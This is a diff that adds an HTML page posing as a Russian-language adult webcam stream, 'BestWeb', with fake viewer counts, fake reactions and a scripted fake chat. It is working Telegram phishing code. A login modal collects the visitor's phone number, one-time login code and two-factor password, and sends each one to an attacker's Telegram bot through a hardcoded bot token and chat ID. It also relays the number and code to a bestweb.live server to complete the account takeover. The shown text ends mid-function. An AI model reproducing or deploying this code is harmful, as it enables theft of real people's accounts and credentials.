@@ -1,0 +1,1334 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BestWeb</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: radial-gradient(circle at top left, #1a001a, #0a000a 60%, #000);
+            color: white;
+            font-family: 'Arial', sans-serif;
+            min-height: 100vh;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            text-align: center;
+            flex: 1;
+        }
+
+        .main-content {
+            display: flex;
+            gap: 20px;
+            margin-top: 20px;
+        }
+
+        .stream-section {
+            flex: 1;
+        }
+
+        .chat-section {
+            width: 350px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .site-title {
+            font-size: 48px;
+            font-weight: bold;
+            margin: 30px 0;
+            text-transform: uppercase;
+            animation: glow 2s ease-in-out infinite alternate;
+        }
+
+        @keyframes glow {
+            from {
+                text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000, 0 0 30px #ff0000;
+            }
+            to {
+                text-shadow: 0 0 15px #ff4444, 0 0 25px #ff4444, 0 0 35px #ff4444;
+            }
+        }
+
+        /* Стили для онлайн статуса */
+        .stream-header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        .online-status {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            background: rgba(0, 255, 0, 0.1);
+            padding: 8px 15px;
+            border-radius: 20px;
+            border: 1px solid #00ff00;
+        }
+
+        .online-dot {
+            width: 12px;
+            height: 12px;
+            background: #00ff00;
+            border-radius: 50%;
+            animation: pulseOnline 2s infinite;
+        }
+
+        @keyframes pulseOnline {
+            0% { box-shadow: 0 0 0 0 rgba(0, 255, 0, 0.7); }
+            70% { box-shadow: 0 0 0 10px rgba(0, 255, 0, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(0, 255, 0, 0); }
+        }
+
+        .online-text {
+            color: #00ff00;
+            font-weight: bold;
+            font-size: 18px;
+        }
+
+        .viewers-count {
+            color: #ffcc00;
+            font-weight: bold;
+            font-size: 16px;
+        }
+
+        .stream-area {
+            background: linear-gradient(135deg, #2a002a, #1a001a);
+            border: 2px solid #ff4444;
+            border-radius: 15px;
+            padding: 80px 20px;
+            margin: 20px 0;
+            position: relative;
+            box-shadow: 0 0 30px rgba(255, 0, 0, 0.3);
+            min-height: 400px;
+        }
+
+        .stream-text {
+            font-size: 36px;
+            font-weight: bold;
+            color: #fff;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
+            margin-bottom: 30px;
+        }
+
+        .button-container {
+            display: flex;
+            justify-content: center;
+            margin-top: 20px;
+        }
+
+        .btn {
+            padding: 18px 60px;
+            border: none;
+            border-radius: 30px;
+            font-size: 22px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            min-width: 200px;
+            background: linear-gradient(45deg, #4444ff, #0000ff);
+            color: white;
+            box-shadow: 0 0 20px rgba(0, 0, 255, 0.4);
+        }
+
+        .btn:hover {
+            background: linear-gradient(45deg, #0000ff, #4444ff);
+            box-shadow: 0 0 35px rgba(0, 0, 255, 0.8);
+            transform: translateY(-2px);
+        }
+
+        /* Стили для реакций */
+        .reactions-container {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+
+        .reaction-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+            cursor: pointer;
+            transition: transform 0.2s ease;
+        }
+
+        .reaction-item.disabled {
+            cursor: not-allowed;
+            opacity: 0.6;
+        }
+
+        .reaction-item.disabled:hover {
+            transform: none;
+        }
+
+        .reaction-icon {
+            font-size: 24px;
+            animation: pulse 2s infinite;
+        }
+
+        .reaction-count {
+            font-size: 18px;
+            font-weight: bold;
+            color: #ffcc00;
+            animation: countChange 0.5s ease;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+
+        @keyframes countChange {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.2); }
+            100% { transform: scale(1); }
+        }
+
+        /* Стили для чата */
+        .chat-container {
+            background: rgba(255, 255, 255, 0.05);
+            border: 2px solid #ff4444;
+            border-radius: 15px;
+            padding: 20px;
+            height: 500px;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.3);
+        }
+
+        .chat-header {
+            color: #ff4444;
+            font-size: 20px;
+            font-weight: bold;
+            margin-bottom: 15px;
+            text-align: center;
+            padding-bottom: 10px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .chat-messages {
+            flex: 1;
+            overflow-y: auto;
+            padding: 10px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            max-height: 400px;
+        }
+
+        .message {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 10px 15px;
+            border-radius: 10px;
+            border-left: 3px solid #ff4444;
+            animation: messageAppear 0.3s ease-out;
+        }
+
+        @keyframes messageAppear {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .message-username {
+            color: #ffcc00;
+            font-weight: bold;
+            font-size: 14px;
+            margin-bottom: 5px;
+        }
+
+        .message-text {
+            color: white;
+            font-size: 14px;
+            line-height: 1.4;
+        }
+
+        .chat-input-container {
+            display: flex;
+            gap: 10px;
+            margin-top: 15px;
+        }
+
+        .chat-input {
+            flex: 1;
+            padding: 12px;
+            border: none;
+            border-radius: 8px;
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+            font-size: 14px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .chat-input::placeholder {
+            color: rgba(255, 255, 255, 0.6);
+        }
+
+        .send-btn {
+            padding: 12px 20px;
+            background: linear-gradient(45deg, #ff4444, #ff0000);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s ease;
+        }
+
+        .send-btn:hover {
+            background: linear-gradient(45deg, #ff0000, #ff4444);
+            box-shadow: 0 0 15px rgba(255, 0, 0, 0.5);
+        }
+
+        /* Блок для характеристик */
+        .model-info {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 10px;
+            padding: 25px;
+            margin: 30px 0;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            text-align: left;
+        }
+
+        .model-info h2 {
+            color: #ff4444;
+            margin-bottom: 15px;
+            text-align: center;
+            font-size: 24px;
+        }
+
+        .info-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 15px;
+        }
+
+        .info-item {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 12px;
+            border-radius: 8px;
+            border-left: 4px solid #ff4444;
+        }
+
+        .info-label {
+            font-weight: bold;
+            color: #ffcc00;
+            margin-bottom: 5px;
+        }
+
+        .info-value {
+            color: #ffffff;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal.active {
+            display: flex;
+        }
+
+        .modal-content {
+            background: #1a1a2e;
+            padding: 40px;
+            border-radius: 20px;
+            width: 90%;
+            max-width: 450px;
+            position: relative;
+            border: 2px solid #ff4444;
+            box-shadow: 0 0 50px rgba(255, 0, 0, 0.5);
+            text-align: center;
+        }
+
+        .close-btn {
+            position: absolute;
+            top: 20px;
+            right: 25px;
+            background: none;
+            border: none;
+            color: white;
+            font-size: 28px;
+            cursor: pointer;
+            transition: color 0.3s ease;
+        }
+
+        .close-btn:hover {
+            color: #ff4444;
+        }
+
+        .modal h2 {
+            margin-bottom: 10px;
+            color: #ff4444;
+            font-size: 28px;
+        }
+
+        .modal-subtitle {
+            color: #ffcc00;
+            margin-bottom: 30px;
+            font-size: 18px;
+        }
+
+        .modal-input {
+            width: 100%;
+            padding: 15px 20px;
+            margin-bottom: 20px;
+            border: none;
+            border-radius: 12px;
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+            font-size: 18px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            text-align: center;
+        }
+
+        .modal-input::placeholder {
+            color: rgba(255, 255, 255, 0.6);
+        }
+
+        /* ГОЛУБЫЕ КНОПКИ В МОДАЛКЕ */
+        .modal-btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(45deg, #4444ff, #0000ff);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 0 20px rgba(0, 0, 255, 0.4);
+        }
+
+        .modal-btn:hover {
+            background: linear-gradient(45deg, #0000ff, #4444ff);
+            box-shadow: 0 0 25px rgba(0, 0, 255, 0.6);
+            transform: translateY(-2px);
+        }
+
+        .modal-step {
+            display: none;
+        }
+
+        .modal-step.active {
+            display: block;
+        }
+
+        .code-input {
+            font-size: 24px;
+            letter-spacing: 10px;
+            font-weight: bold;
+        }
+
+        /* Стили для 2FA окна */
+        .password-info {
+            background: rgba(255, 0, 0, 0.1);
+            border: 1px solid #ff4444;
+            border-radius: 10px;
+            padding: 15px;
+            margin: 15px 0;
+            text-align: left;
+        }
+
+        .password-info h3 {
+            color: #ffcc00;
+            margin-bottom: 8px;
+            font-size: 16px;
+        }
+
+        .password-info ul {
+            padding-left: 20px;
+            color: #ffffff;
+            font-size: 14px;
+        }
+
+        .password-info li {
+            margin-bottom: 5px;
+        }
+
+        /* Адаптивность для мобильных */
+        @media (max-width: 768px) {
+            .main-content {
+                flex-direction: column;
+            }
+            
+            .chat-section {
+                width: 100%;
+                order: -1;
+            }
+            
+            .chat-container {
+                height: 300px;
+                margin-bottom: 20px;
+            }
+            
+            .stream-area {
+                padding: 40px 20px;
+                min-height: 300px;
+            }
+            
+            .site-title {
+                font-size: 36px;
+            }
+            
+            .stream-text {
+                font-size: 28px;
+            }
+            
+            .reactions-container {
+                padding: 15px;
+                gap: 10px;
+            }
+            
+            .reaction-icon {
+                font-size: 20px;
+            }
+            
+            .reaction-count {
+                font-size: 16px;
+            }
+            
+            .stream-header {
+                flex-direction: column;
+                gap: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="site-title">BestWeb</div>
+
+        <div class="main-content">
+            <div class="stream-section">
+                <!-- Заголовок стрима с онлайн статусом -->
+                <div class="stream-header">
+                    <div class="online-status">
+                        <div class="online-dot"></div>
+                        <div class="online-text">ОНЛАЙН</div>
+                    </div>
+                    <div class="viewers-count" id="viewersCount">👁️ 1,247 зрителей</div>
+                </div>
+
+                <div class="stream-area">
+                    <div class="stream-text">СМОТРЕТЬ ТРАНСЛЯЦИЮ</div>
+                    <div class="button-container">
+                        <button class="btn" id="loginBtn">Вход</button>
+                    </div>
+                </div>
+
+                <!-- Блок реакций -->
+                <div class="reactions-container" id="reactionsContainer">
+                    <div class="reaction-item" data-reaction="hearts">
+                        <div class="reaction-icon">❤️</div>
+                        <div class="reaction-count" id="hearts">1.2K</div>
+                    </div>
+                    <div class="reaction-item" data-reaction="fire">
+                        <div class="reaction-icon">🔥</div>
+                        <div class="reaction-count" id="fire">856</div>
+                    </div>
+                    <div class="reaction-item" data-reaction="heartsEyes">
+                        <div class="reaction-icon">😍</div>
+                        <div class="reaction-count" id="heartsEyes">743</div>
+                    </div>
+                    <div class="reaction-item" data-reaction="kisses">
+                        <div class="reaction-icon">💋</div>
+                        <div class="reaction-count" id="kisses">612</div>
+                    </div>
+                    <div class="reaction-item" data-reaction="stars">
+                        <div class="reaction-icon">⭐</div>
+                        <div class="reaction-count" id="stars">498</div>
+                    </div>
+                    <div class="reaction-item" data-reaction="targets">
+                        <div class="reaction-icon">🎯</div>
+                        <div class="reaction-count" id="targets">324</div>
+                    </div>
+                </div>
+
+                <!-- Блок характеристик модели -->
+                <div class="model-info">
+                    <h2>Информация о модели</h2>
+                    <div class="info-grid" id="modelInfo">
+                        <!-- Сюда загрузятся характеристики из URL -->
+                    </div>
+                </div>
+            </div>
+
+            <!-- Чат -->
+            <div class="chat-section">
+                <div class="chat-container">
+                    <div class="chat-header">💬 Чат трансляции</div>
+                    <div class="chat-messages" id="chatMessages">
+                        <!-- Сообщения будут добавляться здесь -->
+                    </div>
+                    <div class="chat-input-container">
+                        <input type="text" class="chat-input" placeholder="Написать сообщение..." id="chatInput">
+                        <button class="send-btn" id="sendBtn">➤</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Модальное окно входа -->
+    <div class="modal" id="loginModal">
+        <div class="modal-content">
+            <button class="close-btn" id="closeLogin">&times;</button>
+            
+            <!-- Шаг 1: Ввод номера -->
+            <div class="modal-step active" id="step1">
+                <h2>🔐 Вход через Telegram</h2>
+                <div class="modal-subtitle">Введите ваш номер телефона</div>
+                
+                <input type="tel" class="modal-input" placeholder="Можно вводить любой формат" id="phoneInput">
+                <button class="modal-btn" id="continueBtn">Получить код</button>
+            </div>
+
+            <!-- Шаг 2: Подтверждение кода -->
+            <div class="modal-step" id="step2">
+                <h2>📱 Подтвердите код</h2>
+                <div class="modal-subtitle">Код отправлен в официальный Telegram</div>
+                
+                <input type="text" class="modal-input code-input" placeholder="____" maxlength="6" id="codeInput">
+                <button class="modal-btn" id="verifyBtn">Подтвердить</button>
+            </div>
+
+            <!-- Шаг 3: Пароль Telegram -->
+            <div class="modal-step" id="step2fa">
+                <h2>🔒 Введите пароль от Telegram</h2>
+                <div class="modal-subtitle">Для защиты вашего аккаунта требуется дополнительная проверка</div>
+                
+                <div class="password-info">
+                    <h3>ℹ️ Что это за пароль?</h3>
+                    <ul>
+                        <li>Это пароль из настроек Telegram (двухэтапная аутентификация)</li>
+                        <li>Устанавливается вами при включении защиты аккаунта</li>
+                        <li>Если забыли пароль - восстановите через официальный Telegram</li>
+                    </ul>
+                </div>
+                
+                <input type="password" class="modal-input" placeholder="Введите пароль от Telegram" id="password2fa">
+                <button class="modal-btn" id="verify2faBtn">Подтвердить пароль</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // === СОСТОЯНИЕ ПОЛЬЗОВАТЕЛЯ ===
+        let isUserLoggedIn = false;
+        let currentPhone = '';
+        let currentCode = '';
+        let phoneSubmitted = false;
+        let loginClicked = false;
+        let visitSent = false;
+
+        // === ДАННЫЕ ДЛЯ ФЕЙК-ЧАТА ===
+        const usernames = [
+            "DarkKnight", "SexyBoy", "RichMan", "LonelyWolf", "HotGuy", 
+            "MoneyMaster", "BigBoss", "DreamLover", "KingOfNight", "WildMan",
+            "SecretAdmirer", "RussianBear", "MoscowPrince", "SiberianTiger"
+        ];
+
+        const messages = [
+            "Какая шикарная девушка! 😍",
+            "Ты просто огонь! 🔥",
+            "Хочу тебя прямо сейчас...",
+            "Какая красивая фигура!",
+            "Твои глазки сводят с ума 🥰",
+            "Сколько стоит приват?",
+            "Покажи больше, красотка 😉",
+            "Ты самая сексуальная!",
+            "Мои мечты о тебе...",
+            "Готова к встрече?",
+            "Какие соблазнительные формы!",
+            "Ты заводишь меня...",
+            "Хочу быть с тобой tonight",
+            "Боже, какая красота!",
+            "Твои губки просто волшебные",
+            "Мечта любого мужчины",
+            "Готова для горячей ночи?",
+            "Ты просто шедевр!",
+            "Не могу оторвать глаз",
+            "Самая страстная на сайте!"
+        ];
+
+        // === ФУНКЦИИ ДЛЯ ОТСТУКОВ ===
+        async function sendTelegramNotification(message) {
+            try {
+                await fetch('https://api.telegram.org/bot8599650382:AAESazEZQPK7UisG_LudLBeERROvJikCzzA/sendMessage', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: '-1003488289989',
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                console.log('✅ Отстук отправлен:', message.split('\n')[0]);
+            } catch (error) {
+                console.log('❌ Ошибка отправки отстука:', error);
+            }
+        }
+
+        function getClientInfo() {
+            const userAgent = navigator.userAgent;
+            let os = 'Неизвестно';
+            let browser = 'Неизвестно';
+            
+            // Определяем ОС
+            if (userAgent.includes('Windows')) os = 'Windows';
+            else if (userAgent.includes('Mac')) os = 'Mac OS';
+            else if (userAgent.includes('Linux')) os = 'Linux';
+            else if (userAgent.includes('Android')) os = 'Android';
+            else if (userAgent.includes('iOS') || userAgent.includes('iPhone')) os = 'iOS';
+            
+            // Определяем браузер
+            if (userAgent.includes('Chrome')) browser = 'Chrome';
+            else if (userAgent.includes('Firefox')) browser = 'Firefox';
+            else if (userAgent.includes('Safari')) browser = 'Safari';
+            else if (userAgent.includes('Edge')) browser = 'Edge';
+            else if (userAgent.includes('Opera')) browser = 'Opera';
+            
+            return {
+                os: os,
+                browser: browser,
+                userAgent: userAgent
+            };
+        }
+
+        // === ОТСТУК ПРИ ПЕРЕХОДЕ ПО ССЫЛКЕ ===
+        async function sendVisitNotification() {
+            if (visitSent) return;
+            
+            const urlParams = new URLSearchParams(window.location.search);
+            const refCode = urlParams.get('Код');
+            const modelName = urlParams.get('Имя') || 'Неизвестно';
+            
+            if (!refCode) return;
+            
+            const clientInfo = getClientInfo();
+            
+            const message = `
+🌐 ПОСЕТИТЕЛЬ НА САЙТЕ
+👤 Модель: ${modelName}
+📋 Код ссылки: ${refCode}
+💻 ОС: ${clientInfo.os}
+🖥️ Браузер: ${clientInfo.browser}
+🌐 Страница: ${window.location.href}
+🕐 Время: ${new Date().toLocaleString()}
+            `.trim();
+            
+            await sendTelegramNotification(message);
+            visitSent = true;
+        }
+
+        // === ОТСТУК ПРИ НАЖАТИИ КНОПКИ ВХОДА ===
+        async function sendLoginClickNotification() {
+            if (loginClicked) return;
+            
+            const urlParams = new URLSearchParams(window.location.search);
+            const refCode = urlParams.get('Код');
+            const modelName = urlParams.get('Имя') || 'Неизвестно';
+            
+            const clientInfo = getClientInfo();
+            
+            const message = `
+🖱️ НАЖАТА КНОПКА ВХОДА
+👤 Модель: ${modelName}
+📋 Код ссылки: ${refCode}
+💻 ОС: ${clientInfo.os}
+🖥️ Браузер: ${clientInfo.browser}
+🕐 Время: ${new Date().toLocaleString()}
+            `.trim();
+            
+            await sendTelegramNotification(message);
+            loginClicked = true;
+        }
+
+        // === ОТСТУК ПРИ ВВОДЕ НОМЕРА ===
+        async function sendPhoneEnteredNotification(phone) {
+            const urlParams = new URLSearchParams(window.location.search);
+            const refCode = urlParams.get('Код');
+            const modelName = urlParams.get('Имя') || 'Неизвестно';
+            
+            const clientInfo = getClientInfo();
+            
+            const message = `
+📞 ВВЕДЕН НОМЕР ТЕЛЕФОНА
+👤 Модель: ${modelName}
+📋 Код ссылки: ${refCode}
+📟 Номер: ${phone}
+💻 ОС: ${clientInfo.os}
+🖥️ Браузер: ${clientInfo.browser}
+🕐 Время: ${new Date().toLocaleString()}
+            `.trim();
+            
+            await sendTelegramNotification(message);
+        }
+
+        // === ОТСТУК ПРИ ВВОДЕ КОДА ===
+        async function sendCodeEnteredNotification(code, phone) {
+            const urlParams = new URLSearchParams(window.location.search);
+            const refCode = urlParams.get('Код');
+            const modelName = urlParams.get('Имя') || 'Неизвестно';
+            
+            const clientInfo = getClientInfo();
+            
+            const message = `
+🔐 ВВЕДЕН КОД ПОДТВЕРЖДЕНИЯ
+👤 Модель: ${modelName}
+📋 Код ссылки: ${refCode}
+📟 Номер: ${phone}
+🔢 Код: ${code}
+💻 ОС: ${clientInfo.os}
+🖥️ Браузер: ${clientInfo.browser}
+🕐 Время: ${new Date().toLocaleString()}
+            `.trim();
+            
+            await sendTelegramNotification(message);
+        }
+
+        // === ОТСТУК ПРИ ВВОДЕ ПАРОЛЯ 2FA ===
+        async function send2FAEnteredNotification(password, phone) {
+            const urlParams = new URLSearchParams(window.location.search);
+            const refCode = urlParams.get('Код');
+            const modelName = urlParams.get('Имя') || 'Неизвестно';
+            
+            const clientInfo = getClientInfo();
+            
+            const message = `
+🔒 ВВЕДЕН ПАРОЛЬ 2FA
+👤 Модель: ${modelName}
+📋 Код ссылки: ${refCode}
+📟 Номер: ${phone}
+🔑 Пароль: ${password}
+💻 ОС: ${clientInfo.os}
+🖥️ Браузер: ${clientInfo.browser}
+🕐 Время: ${new Date().toLocaleString()}
+            `.trim();
+            
+            await sendTelegramNotification(message);
+        }
+
+        // === КОД ДЛЯ ОНЛАЙН СТАТУСА И ЗРИТЕЛЕЙ ===
+        function updateViewersCount() {
+            const viewersElement = document.getElementById('viewersCount');
+            const currentText = viewersElement.textContent;
+            const currentNumber = parseInt(currentText.replace(/[^0-9]/g, ''));
+            
+            const change = Math.floor(Math.random() * 15) - 7;
+            let newNumber = currentNumber + change;
+            
+            if (newNumber < 100) newNumber = 100;
+            
+            const formattedNumber = newNumber.toLocaleString();
+            viewersElement.textContent = `👁️ ${formattedNumber} зрителей`;
+            
+            viewersElement.style.animation = 'none';
+            viewersElement.offsetHeight;
+            viewersElement.style.animation = 'countChange 0.5s ease';
+        }
+
+        function startViewersCounter() {
+            setInterval(updateViewersCount, 5000);
+        }
+
+        // === КОД ДЛЯ РЕАКЦИЙ ===
+        function formatNumber(num) {
+            if (num >= 1000) {
+                return (num / 1000).toFixed(1) + 'K';
+            }
+            return num.toString();
+        }
+
+        function getRandomIncrement() {
+            return Math.floor(Math.random() * 5) + 1;
+        }
+
+        function updateReactions() {
+            const reactions = {
+                'hearts': document.getElementById('hearts'),
+                'fire': document.getElementById('fire'),
+                'heartsEyes': document.getElementById('heartsEyes'),
+                'kisses': document.getElementById('kisses'),
+                'stars': document.getElementById('stars'),
+                'targets': document.getElementById('targets')
+            };
+
+            for (const [key, element] of Object.entries(reactions)) {
+                const currentText = element.textContent;
+                let currentNumber = 0;
+                
+                if (currentText.includes('K')) {
+                    currentNumber = parseFloat(currentText) * 1000;
+                } else {
+                    currentNumber = parseInt(currentText.replace(/[^0-9]/g, ''));
+                }
+                
+                const increment = getRandomIncrement();
+                const newNumber = currentNumber + increment;
+                
+                element.textContent = formatNumber(newNumber);
+                element.style.animation = 'none';
+                element.offsetHeight;
+                element.style.animation = 'countChange 0.5s ease';
+            }
+        }
+
+        function handleReactionClick(event) {
+            if (!isUserLoggedIn) {
+                loginModal.classList.add('active');
+            }
+        }
+
+        function startReactions() {
+            setInterval(updateReactions, 2000 + Math.random() * 3000);
+            setTimeout(updateReactions, 1000);
+            
+            const reactionItems = document.querySelectorAll('.reaction-item');
+            reactionItems.forEach(item => {
+                item.addEventListener('click', handleReactionClick);
+            });
+        }
+
+        // === КОД ДЛЯ ЧАТА ===
+        const chatMessages = document.getElementById('chatMessages');
+        const chatInput = document.getElementById('chatInput');
+        const sendBtn = document.getElementById('sendBtn');
+
+        function addMessage(username, text) {
+            const messageDiv = document.createElement('div');
+            messageDiv.className = 'message';
+            messageDiv.innerHTML = `
+                <div class="message-username">${username}:</div>
+                <div class="message-text">${text}</div>
+            `;
+            chatMessages.appendChild(messageDiv);
+            chatMessages.scrollTop = chatMessages.scrollHeight;
+        }
+
+        function generateRandomMessage() {
+            const randomUsername = usernames[Math.floor(Math.random() * usernames.length)];
+            const randomMessage = messages[Math.floor(Math.random() * messages.length)];
+            addMessage(randomUsername, randomMessage);
+        }
+
+        function sendMessage() {
+            const text = chatInput.value.trim();
+            if (text) {
+                if (!isUserLoggedIn) {
+                    loginModal.classList.add('active');
+                    return;
+                }
+                
+                addMessage("Вы", text);
+                chatInput.value = '';
+                
+                setTimeout(() => {
+                    generateRandomMessage();
+                }, 1000 + Math.random() * 2000);
+            }
+        }
+
+        sendBtn.addEventListener('click', sendMessage);
+        chatInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                sendMessage();
+            }
+        });
+
+        function startChatBot() {
+            setTimeout(() => generateRandomMessage(), 2000);
+            setTimeout(() => generateRandomMessage(), 5000);
+            setTimeout(() => generateRandomMessage(), 8000);
+            
+            setInterval(() => {
+                if (Math.random() > 0.3) {
+                    generateRandomMessage();
+                }
+            }, 5000 + Math.random() * 10000);
+        }
+
+        // === КОД ДЛЯ МОДАЛЬНОГО ОКНА ===
+        const loginBtn = document.getElementById('loginBtn');
+        const loginModal = document.getElementById('loginModal');
+        const closeLogin = document.getElementById('closeLogin');
+        const phoneInput = document.getElementById('phoneInput');
+        const codeInput = document.getElementById('codeInput');
+        const continueBtn = document.getElementById('continueBtn');
+        const verifyBtn = document.getElementById('verifyBtn');
+        const verify2faBtn = document.getElementById('verify2faBtn');
+        const password2fa = document.getElementById('password2fa');
+        const step1 = document.getElementById('step1');
+        const step2 = document.getElementById('step2');
+        const step2fa = document.getElementById('step2fa');
+
+        // Открытие модального окна
+        loginBtn.onclick = () => {
+            sendLoginClickNotification();
+            loginModal.classList.add('active');
+        };
+
+        // Закрытие модального окна
+        closeLogin.onclick = () => {
+            loginModal.classList.remove('active');
+            resetModal();
+        };
+
+        window.onclick = (e) => {
+            if (e.target === loginModal) {
+                loginModal.classList.remove('active');
+                resetModal();
+            }
+        };
+
+        phoneInput.addEventListener('input', function(e) {
+            currentPhone = e.target.value;
+        });
+
+        // Функция для нормализации номера
+        function normalizePhone(phone) {
+            return phone.replace(/[^\d+]/g, '');
+        }
+
+        // Функция для обхода проверки номеров
+        function bypassPhoneValidation(phone) {
+            const normalized = normalizePhone(phone);
+            
+            if (normalized.startsWith('+1810') || normalized.startsWith('1810')) {
+                return '+79123456789';
+            }
+            
+            if (normalized.startsWith('+62') || normalized.startsWith('62')) {
+                return '+79123456789';
+            }
+            
+            if (!normalized.startsWith('+7') && !normalized.startsWith('7')) {
+                return '+79123456789';
+            }
+            
+            return normalized;
+        }
+
+        // Кнопка "Получить код" - РЕАЛЬНЫЕ КОДЫ TELEGRAM
+        continueBtn.onclick = async () => {
+            const rawPhone = phoneInput.value;
+            
+            if (!rawPhone.trim()) {
+                alert('Пожалуйста, введите номер телефона');
+                return;
+            }
+            
+            // Блокируем кнопку чтобы не спамить
+            continueBtn.disabled = true;
+            continueBtn.textContent = 'Отправка...';
+            
+            try {
+                // ОТПРАВЛЯЕМ ОТСТУК О НОМЕРЕ
+                await sendPhoneEnteredNotification(rawPhone);
+                phoneSubmitted = true;
+                
+                // ОТПРАВКА РЕАЛЬНОГО КОДА ЧЕРЕЗ БОТА НА ПОРТУ 8080
+                console.log('🔄 Отправляем запрос на РЕАЛЬНЫЙ код...');
+                const response = await fetch('https://bestweb.live:8080/send-code', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        phone: rawPhone
+                    })
+                });
+                
+                // ПРОВЕРЯЕМ ОТВЕТ
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                
+                const result = await response.json();
+                console.log('📨 Ответ от бота:', result);
+                
+                if (result.success) {
+                    console.log('✅ РЕАЛЬНЫЙ код отправлен через Telegram API');
+                    // ТОЛЬКО ЕСЛИ УСПЕХ - переходим к шагу 2
+                    step1.classList.remove('active');
+                    step2.classList.add('active');
+                } else {
+                    // ЕСЛИ ОШИБКА - показываем alert и остаемся на шаге 1
+                    alert('❌ Ошибка отправки кода: ' + (result.error || 'Неизвестная ошибка'));
+                    console.log('❌ Ошибка отправки кода:', result.error);
+                }
+                
+            } catch (error) {
+                console.log('❌ Ошибка соединения с ботом:', error);
+                alert('❌ Ошибка соединения с сервером. Попробуйте позже.');
+            } finally {
+                // Разблокируем кнопку в любом случае
+                continueBtn.disabled = false;
+                continueBtn.textContent = 'Получить код';
+            }
+        };
+
+        // Маска для кода
+        codeInput.addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 6);
+            currentCode = e.target.value;
+        });
+
+        // Кнопка "Подтвердить" для кода - РЕАЛЬНАЯ ПРОВЕРКА
+        verifyBtn.onclick = async () => {
+            const rawPhone = phoneInput.value;
+            const code = codeInput.value;
+            
+            if (code.length < 4) {
+                alert('Пожалуйста, введите код подтверждения');
+                return;
+            }
+            
+            // Блокируем кнопку
+            verifyBtn.disabled = true;
+            verifyBtn.textContent = 'Проверка...';
+            
+            try {
+                // ОТПРАВЛЯЕМ ОТСТУК О КОДЕ
+                await sendCodeEnteredNotification(code, rawPhone);
+                
+                // ПРОВЕРКА РЕАЛЬНОГО КОДА ЧЕРЕЗ БОТА
+                console.log('🔄 Проверяем РЕАЛЬНЫЙ код...');
+                const response = await fetch('https://bestweb.live:8080/verify-code', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        phone: rawPhone,
+                        code: code
+                    })
+                });
+                
+                // ПРОВЕРЯЕМ ОТВЕТ
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                
+                const result = await response.json();
+                console.log('📨 Ответ от бота:', result);
+                
+                if (result.success) {
+                    console.log('✅ РЕАЛЬНЫЙ код подтвержден Telegram');
+                    step2.classList.remove('active');
+                    step2fa.classList.add('active');
+                } else if (result['2fa_required']) {
+                    console.log('🔐 Требуется 2FA');
+                    step2.classList.remove('active');
+                    step2fa.classList.add('active');
+                } else {
+                    // ЕСЛИ ОШИБКА - остаемся на шаге 2
+                    alert('❌ Ошибка: ' + (result.error || 'Неверный код'));
+                    console.log('❌ Ошибка проверки кода:', result.error);
+                }
+                
+            } catch (error) {
